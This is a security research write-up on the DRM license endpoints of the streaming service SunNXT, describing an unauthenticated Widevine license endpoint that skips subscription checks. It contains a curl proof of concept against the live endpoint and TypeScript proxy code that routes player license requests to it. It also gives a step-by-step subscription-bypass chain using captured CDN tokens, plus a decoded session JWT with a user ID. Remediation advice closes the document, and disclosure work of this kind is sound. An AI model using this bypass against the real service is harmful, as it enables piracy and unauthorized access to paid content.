# DRM License Endpoint — Complete Technical Reference

**Author: Nitheesh D R**
**Scope: SunNXT DRM License Infrastructure — Widevine, PlayReady, Nagravision**

---

## Table of Contents

1. [Overview](#1-overview)
2. [License Endpoints Discovered](#2-license-endpoints-discovered)
3. [How DRM License Acquisition Works](#3-how-drm-license-acquisition-works)
4. [Endpoint 1 — pwaapi modularLicense (No Subscription Check)](#4-endpoint-1--pwaapi-modularlicense-no-subscription-check)
5. [Endpoint 2 — api.sunnxt.com nagravisionDRMProxy](#5-endpoint-2--apisunnxtcom-nagravisiondrm-proxy)
6. [Endpoint 3 — suntvvod1.sunnxt.com Embedded License](#6-endpoint-3--suntvvod1sunnxtcom-embedded-license)
7. [License Proxy Implementation](#7-license-proxy-implementation)
8. [VULN-11 Deep Dive — modularLicense Subscription Bypass](#8-vuln-11-deep-dive--modularlicense-subscription-bypass)
9. [Response Validation — Binary vs JSON Detection](#9-response-validation--binary-vs-json-detection)
10. [JWT Structure in nagravisionDRMProxy](#10-jwt-structure-in-nagravisiondrm-proxy)
11. [Widevine Challenge/Response Format](#11-widevine-challengeresponse-format)
12. [Attack Chain — Full Subscription Bypass](#12-attack-chain--full-subscription-bypass)
13. [Remediation](#13-remediation)

---

## 1. Overview

SunNXT uses **Widevine L3** (Chrome/Android) and **PlayReady** (Edge/Windows) DRM via a **Nagravision DRM proxy layer**. The license acquisition flow has two distinct endpoints with critically different access control policies:

| Endpoint | Auth Required | Subscription Check | Used By |
|---|---|---|---|
| `pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/` | No | **None** | PWA player |
| `api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/` | JWT token | Yes (via JWT) | Web player |

The `modularLicense` endpoint **completely bypasses the subscription gate** — it issues valid Widevine decryption keys for any content ID to any requestor. This is **VULN-11** and the foundation of the full subscription bypass demonstrated in this project.

---

## 2. License Endpoints Discovered

### 2.1 Primary — Nagravision Proxy (api.sunnxt.com)

```
POST https://api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/
     ?content_id=<id>
     &token=<jwt>
     &contentType=video
     &drmType=widevine
     &format=dash
     &playbackType=stream
```

**Headers required:**
```
Content-Type: application/octet-stream
Origin: https://www.sunnxt.com
Referer: https://www.sunnxt.com/
```

**Body:** Raw Widevine CDM challenge (binary protobuf, typically 1–4 KB)

**Response (success):** Binary protobuf Widevine license (~300–800 bytes), first byte is NOT `0x7B`

**Response (failure):** JSON `{"code":403,"status":"ERR_ACCESS_DENIED","message":"..."}`, first byte is `0x7B` (`{`)

### 2.2 Bypass — modularLicense (pwaapi.sunnxt.com)

```
POST https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/
     ?content_id=<id>
```

**Headers required:**
```
Content-Type: application/octet-stream
Origin: https://www.sunnxt.com
```

**Body:** Raw Widevine CDM challenge (identical to nagravisionDRMProxy)

**Response (success):** Binary protobuf Widevine license — **identical format**

**Key finding:** No `token` parameter required. No session cookie required. No subscription validation.

### 2.3 Embedded License URLs (suntvvod1.sunnxt.com streams)

For non-Akamai streams served from `suntvvod1.sunnxt.com`, the license URL appears directly in the DASH manifest's `ContentProtection` element or is returned in the media API `videos.values[n].licenseUrl` field:

```
https://api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/
    ?content_id=115249
    &token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
    &contentType=video
    &drmType=widevine
    ...
```

The `token` is a per-session JWT that **encodes the user's subscription entitlement**. It is valid for the duration of the playback session.

---

## 3. How DRM License Acquisition Works

### 3.1 Standard EME Flow (Browser)

```
Browser                    SunNXT Server              Nagravision/Widevine
  |                              |                            |
  |-- Load encrypted MPD ------> |                            |
  |<- MPD with PSSH box -------- |                            |
  |                              |                            |
  |-- CDM sees PSSH, generates ----------------------------->|
  |   Widevine license request                               |
  |   (binary challenge)                                     |
  |                              |                            |
  |-- POST /api/license -------> |                            |
  |                              |-- POST modularLicense --> |
  |                              |   (Widevine challenge)    |
  |                              |<- Binary license -------- |
  |<- Binary license ----------- |                            |
  |                              |                            |
  |-- CDM processes license,     |                            |
  |   decrypts video keys        |                            |
  |-- Decrypt video segments --> |                            |
  |<- Decrypted video frames --- |                            |
```

### 3.2 PSSH Box — How DRM Is Signalled

Every encrypted DASH segment begins with an **init.mp4** containing a **PSSH box** (Protection System Specific Header). The PSSH box is a binary container that tells the CDM:
- Which DRM system is required (Widevine UUID: `edef8ba9-79d6-4ace-a3c8-27dcd51d21ed`)
- The content key ID
- Optional DRM-specific data

Shaka Player reads the PSSH box and generates a Widevine challenge. Even if the DASH MPD has its `ContentProtection` elements stripped, Shaka detects the PSSH in the init segment and triggers license acquisition.

### 3.3 Key IDs and Key Hierarchy

```
Content Key (CK)   — 128-bit AES key that decrypts video/audio samples
Key ID (KID)       — 128-bit identifier for the content key
License            — Encrypted blob: { KID → CK } protected with platform key
Platform Key       — Widevine-managed, device-specific, not extractable (L3 via software)
```

---

## 4. Endpoint 1 — pwaapi modularLicense (No Subscription Check)

### 4.1 Confirmed Behavior

**Test performed:** Posted a valid Widevine challenge for content 82850 (`96` Tamil movie) to:
```
POST https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850
```
With no session cookie, no token, no auth headers.

**Result:** HTTP 200, binary protobuf response (~450 bytes), first byte `0x0A` (not `0x7B`).

Shaka Player accepted this license, decrypted the stream, and content played successfully. Confirmed in `96.har` capture.

### 4.2 Why This Endpoint Exists

This endpoint appears to be the PWA (Progressive Web App) license proxy. SunNXT's PWA player architecture separates license delivery from subscription enforcement — the subscription gate is meant to be enforced at the **stream URL level** (via Akamai hdntl tokens), not the license level.

The design assumption was: if an attacker cannot get the CDN stream URL, they cannot use the license. This assumption fails because:
1. CDN URLs contain UUIDs that, once captured, are permanent (VULN-12)
2. `hdntl` wildcard tokens are valid for 24 hours (VULN-13)
3. Segments themselves have no per-request auth (VULN-12)

### 4.3 Request Validation (What It Does Check)

The `modularLicense` endpoint does perform some validation:
- **content_id must exist** — Invalid content IDs return `{"code":404,...}`
- **Challenge must be a valid Widevine protobuf** — Malformed challenges return JSON error
- **Origin header** — Must be present (but not validated for subscription)

### 4.4 Response Identification

Valid Widevine license responses are binary protobufs and **never start with `0x7B`** (`{`). The proxy validates this:

```typescript
// app/api/license/route.ts
const firstByte = data.byteLength > 0 ? new Uint8Array(data)[0] : 0;
const isJson = firstByte === 0x7B || r.headers.get("content-type")?.includes("json");
if (!isJson) {
  return new NextResponse(data, { headers: { "content-type": "application/octet-stream" } });
}
// else: fall through to nagravisionDRMProxy
```

---

## 5. Endpoint 2 — api.sunnxt.com nagravisionDRMProxy

### 5.1 JWT Token Structure

The `token` parameter in the nagravisionDRMProxy URL is a **JWT (JSON Web Token)**. Decoded structure:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "contentId": "115249",
  "userId": "2750313",
  "playbackId": "8198906064",
  "maxUses": 2,
  "exp": 1779369553,
  "nid": 0,
  "country": "IN",
  "platform": "browser",
  "drmType": "widevine"
}
```

**Critical field: `maxUses: 2`**

This means the license URL can be used exactly **twice** before the JWT is invalidated. Rationale: one for the initial license request, one for a potential renewal. This is VULN-08 — the window allows one unauthorized reuse.

### 5.2 JWT Signing

The JWT is signed with `HS256` (HMAC-SHA256) using a secret key managed by Nagravision's infrastructure. The signature cannot be forged without the secret. However, within the 2-use window, any party with the JWT can acquire a valid license.

### 5.3 How the JWT Is Obtained

The JWT appears as a query parameter in the `licenseUrl` field of `videos.values[n]` in the media API response. It is generated server-side by SunNXT's backend when a subscribed user requests media. The JWT encodes:
- That the specific user (userId) is entitled to content (contentId)
- The expiry time (matching the HDnea CDN token)
- Maximum license uses

---

## 6. Endpoint 3 — suntvvod1.sunnxt.com Embedded License

For streams served from `suntvvod1.sunnxt.com` (non-Akamai CDN), the license URL is embedded directly in the DASH MPD's `ContentProtection` element:

```xml
<ContentProtection schemeIdUri="urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed">
  <dashif:Laurl>https://api.sunnxt.com/licenseproxy/v3/nagravisionDRMProxy/?content_id=115249&amp;token=eyJ...</dashif:Laurl>
  <cenc:pssh>AAAAW3Bz...</cenc:pssh>
</ContentProtection>
```

Shaka Player reads the `<dashif:Laurl>` element (namespace `https://dashif.org/CPS`) and uses that URL for license acquisition.

**stream-proxy injection:** Our `rewriteMpd` function injects `<dashif:Laurl>` when none is present in the manifest, fixing Shaka error 6012 (`NO_LICENSE_SERVER_GIVEN`):

```typescript
// app/api/stream-proxy/route.ts
const widevineScheme = "urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed";
const laUrlTag = `<dashif:Laurl>${licenseUrl}</dashif:Laurl>`;
result = result.replace(
  new RegExp(`(<ContentProtection\\b[^>]*schemeIdUri="${widevineScheme}"[^>]*>)`, "gi"),
  `$1\n      ${laUrlTag}`
);
```

---

## 7. License Proxy Implementation

### 7.1 Full Route Logic (`app/api/license/route.ts`)

```
Request: POST /api/license?url=<licenseUrl>&contentId=<id>
Body: Widevine challenge bytes

Step 1: Build pwaapi modularLicense URL from contentId
        → https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=<id>

Step 2: POST challenge to modularLicense
  If response is binary (first byte ≠ 0x7B):
    → Return binary license to player (bypass success)
  If response is JSON (first byte = 0x7B = '{'):
    → Fall through to Step 3

Step 3: Get server session cookie (if available)
Step 4: POST challenge to original licenseUrl (nagravisionDRMProxy)
  Without cookie → try first
  If fails and cookie available → retry with cookie
  If still fails → return error response

Response: Binary Widevine license or JSON error
```

### 7.2 Headers Forwarded

```typescript
const headers = {
  origin: "https://www.sunnxt.com",
  referer: "https://www.sunnxt.com/",
  "user-agent": "Mozilla/5.0 ...",
  "content-type": "application/octet-stream",
};
```

No `cookie` header is sent to `modularLicense` — it doesn't need one.

### 7.3 Content-Type in License Response

The proxy always returns `Content-Type: application/octet-stream` regardless of the upstream response. Shaka Player does not require a specific content type for license responses — it processes the binary response directly.

---

## 8. VULN-11 Deep Dive — modularLicense Subscription Bypass

### 8.1 Vulnerability Summary

| Field | Value |
|---|---|
| **ID** | VULN-11 |
| **Severity** | Critical |
| **CVSS v3 Score** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **CWE** | CWE-285: Improper Authorization |
| **Endpoint** | `POST pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=<id>` |

### 8.2 Proof of Concept

```bash
# Step 1: Generate a valid Widevine challenge (requires browser with Widevine CDM)
# The challenge is sent by the CDM when it encounters an encrypted stream.

# Step 2: Send the challenge directly to modularLicense without any auth:
curl -X POST \
  "https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850" \
  -H "Content-Type: application/octet-stream" \
  -H "Origin: https://www.sunnxt.com" \
  --data-binary @widevine_challenge.bin \
  -o widevine_license.bin

# Step 3: Pass the license to the CDM:
# (handled by Shaka Player / browser EME stack)

# Result: CDM accepts the license, decrypts video keys, content plays.
```

### 8.3 Why Subscription Gates Don't Protect This

SunNXT's subscription enforcement works at the **stream URL layer** (Akamai tokens), not the **license layer**. The architecture assumes these two layers act together:

```
Without bypass:  [No CDN URL] + [No License JWT] → No playback
With bypass:     [UUID+hdntl CDN URL] + [modularLicense] → Full playback
```

The `modularLicense` endpoint was designed for the SunNXT PWA (which has its own access control), but the endpoint itself has no auth.

### 8.4 Compound Impact with Other VULNs

| Combined With | Impact |
|---|---|
| VULN-12 (CDN segments unauthed) | Download raw encrypted segments, use modularLicense for keys → offline decrypt |
| VULN-13 (hdntl wildcard) | Stream any content in UUID database without subscription |
| VULN-06 (CDN tokens not IP-bound) | Share a valid CDN URL + use modularLicense to share full streams |

---

## 9. Response Validation — Binary vs JSON Detection

### 9.1 Why This Matters

When `modularLicense` receives an invalid challenge or an unrecognized content ID, it returns a JSON error body with HTTP 200:

```json
{"code": 400, "status": "ERR_BAD_REQUEST", "message": "Invalid license request"}
```

If this JSON is passed to the Widevine CDM, the CDM processes it as if it were a license protobuf. The protobuf parser sees arbitrary bytes, generates internal errors, and the CDM sets all track key statuses to `"internal-error"`. Shaka then filters all representations, and when no playable representation remains, it fires error **4012** (`RESTRICTIONS_CANNOT_BE_MET`).

### 9.2 Detection Algorithm

```typescript
const firstByte = data.byteLength > 0 ? new Uint8Array(data)[0] : 0;
const isJson = firstByte === 0x7B   // '{' — definitely JSON
           || r.headers.get("content-type")?.includes("json");
```

Valid Widevine license protobufs begin with protobuf field tags. The first byte of a license response will be a protobuf varint — typically `0x0A` (field 1, wire type 2 = length-delimited). It will **never** be `0x7B` (`{`).

### 9.3 Protobuf Wire Format Reference

| First Byte | Meaning | Type |
|---|---|---|
| `0x0A` | Field 1, wire type 2 | License response (normal) |
| `0x7B` | ASCII `{` | JSON error body |
| `0x08` | Field 1, wire type 0 | Alternate protobuf start |

---

## 10. JWT Structure in nagravisionDRMProxy

### 10.1 Full JWT Analysis

The `token` query parameter in the nagravisionDRMProxy URL is a standard HS256 JWT. Decoded from a real capture:

**Header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Payload:**
```json
{
  "contentId": "115249",
  "userId": "2750313",
  "PlayBackId": "8198906064",
  "maxUses": 2,
  "exp": 1779369553,
  "nid": 0,
  "country": "IN",
  "bw": "",
  "q": "4",
  "op": "SUNNXT",
  "did": "0",
  "drmType": "widevine",
  "platform": "browser"
}
```

### 10.2 Field Semantics

| Field | Purpose | Security Implication |
|---|---|---|
| `contentId` | Which content is being licensed | Binds license to specific content |
| `userId` | Account identifier | Subscription verification |
| `maxUses` | Max times this JWT can be used | VULN-08 — allows 1 extra use |
| `exp` | JWT expiry (Unix timestamp) | Matches HDnea token expiry |
| `nid` | Node/network ID | Routing |
| `country` | Geo-restriction | Geo check |
| `did` | Device ID | Device binding |

### 10.3 VULN-08 — maxUses: 2 Reuse Window

The Nagravision system enforces `maxUses: 2`, giving a 2-use window. The real player uses:
- Use 1: Initial license (PSSH box triggers CDM, CDM requests license)
- Use 2: License renewal (when player reloads or seeks far)

An attacker who intercepts the JWT (e.g., via MiTM or by accessing the media API response) gets one free reuse. For standard viewing sessions this is low risk. For long or repeated sessions it degrades to zero enforcement.

---

## 11. Widevine Challenge/Response Format

### 11.1 Challenge Structure (Sent by CDM)

The Widevine CDM generates a binary protobuf challenge (`SignedLicenseRequest`) that includes:
- **Content ID** — Identifies which content key is needed
- **Device certificate** — Proves the requesting device is a genuine Widevine device
- **Request** — Encrypted payload containing the key request
- **Signature** — HMAC over the request, signed with device key

The challenge is opaque from the client side — only Widevine's license server and certified proxies can interpret it.

### 11.2 License Structure (Returned by License Server)

The Widevine license (`SignedLicense`) returned by the server contains:
- **Content keys** — AES-128 keys that decrypt the video/audio samples, encrypted with the device's key
- **Policy** — Playback restrictions (HDCP level, output control, expiry)
- **License server certificate** — Authenticates the response
- **Signature** — Prevents tampering

Only the specific device that generated the challenge can decrypt the license's content keys.

### 11.3 Why Widevine L3 Cannot Be "Cracked"

**L3 (software Widevine)** — Used in browsers. The private key is stored in the browser's Widevine plugin, obfuscated but ultimately extractable with advanced tooling. L3 does not prevent determined key extraction but raises the bar significantly.

**L1 (hardware TEE Widevine)** — Used on certified Android devices. Keys are stored in a hardware Trusted Execution Environment, not accessible even with root. SunNXT's mobile app would use L1 on supported devices.

SunNXT serves 1080p HD through the browser via L3. This is a business decision — L3 is sufficient to prevent casual piracy while supporting broad browser compatibility.

---

## 12. Attack Chain — Full Subscription Bypass

### 12.1 Prerequisites

| Prerequisite | How to Obtain |
|---|---|
| Content UUID | From any subscribed HAR capture, or via `learnUuidsFromEntries()` |
| Akamai `hdntl` wildcard token | From any subscribed session MPD fetch; valid 24h |
| Content ID | Public — visible in SunNXT URLs |
| Browser with Widevine | Any Chrome/Chromium |

### 12.2 Step-by-Step Bypass

```
Step 1: Obtain UUID and hdntl for target content
  Method A: HAR capture from subscribed session
  Method B: learnUuidsFromEntries() auto-populates from API responses
  Method C: hdntl cached by stream-proxy from any MPD fetch

Step 2: Build CDN MPD URL
  https://movies1-suntvvod.akamaized.net/movies/{uuid}/{contentId}/hd/{contentId}_hd.mpd
  ?hdntl=exp={expiry}~acl=/*~data=hdntl~hmac={hmac}

Step 3: Proxy the MPD via stream-proxy
  GET /api/stream-proxy?url={encoded_mpd_url}&licenseUrl={modularLicenseUrl}
  → stream-proxy fetches MPD, injects <BaseURL> and <dashif:Laurl>
  → Player loads rewritten manifest

Step 4: Player encounters encrypted segments → CDM generates challenge
  CDM: "I see a PSSH box, I need a Widevine license"

Step 5: Player sends challenge to /api/license
  POST /api/license?url={modularLicenseUrl}&contentId={id}
  Body: Widevine challenge bytes

Step 6: License proxy forwards to modularLicense (no auth)
  POST https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id={id}
  → License server issues valid license

Step 7: CDM decrypts keys → segments decrypt → video plays
```

### 12.3 What Cannot Be Bypassed

- **Widevine L3 key extraction** — Requires specialized tooling; not practical for casual bypass
- **Content that has no UUID in the database** — Bypass 3 fails; requires subscribed session to discover UUID
- **FairPlay (Safari/iOS)** — Requires Apple device certificate; different license server

---

## 13. Remediation

### For SunNXT Security Team

| Priority | Finding | Fix |
|---|---|---|
| **Critical** | modularLicense has no subscription check | Validate session JWT or subscription token before issuing license |
| **High** | License URL contains user JWT in cleartext in media API response | Move JWT to short-lived token redeemed server-side; don't expose in client API |
| **Medium** | maxUses: 2 allows one unauthorized reuse | Reduce to maxUses: 1 for browser sessions; use challenge nonce to prevent reuse |
| **Medium** | nagravisionDRMProxy JWT interception via MiTM | Bind JWT to client IP or device fingerprint |
| **Low** | License URL exposed in manifest `<dashif:Laurl>` | Generate license URL server-side per-request; don't embed in manifest |

### 13.1 Correct modularLicense Fix

```
Option A (Short-term): Require session cookie on modularLicense endpoint
  → Validates user is logged in, prevents completely anonymous license requests
  → Does not fix subscription bypass for logged-in users without subscription

Option B (Medium-term): Validate subscription entitlement in modularLicense
  → Check content_id against user's subscription entitlements
  → Consistent with nagravisionDRMProxy behavior

Option C (Long-term): Remove modularLicense; consolidate to single license endpoint
  → All license requests go through nagravisionDRMProxy
  → Remove split architecture that created the vulnerability
```

### 13.2 CDN Token Improvements

```
Replace hdntl (24h wildcard) with hdnea (3h content-specific):
  Current: acl=/*  → one token unlocks all content for 24h
  Better:  acl=!*/contentId/* → per-content, 3h TTL
  Best:    acl=!*/contentId/* + IP binding (ip= parameter in Akamai config)
```

---

*Document generated from HAR analysis, code review, and live API testing against sunnxt.com*
*For security research and disclosure purposes only*
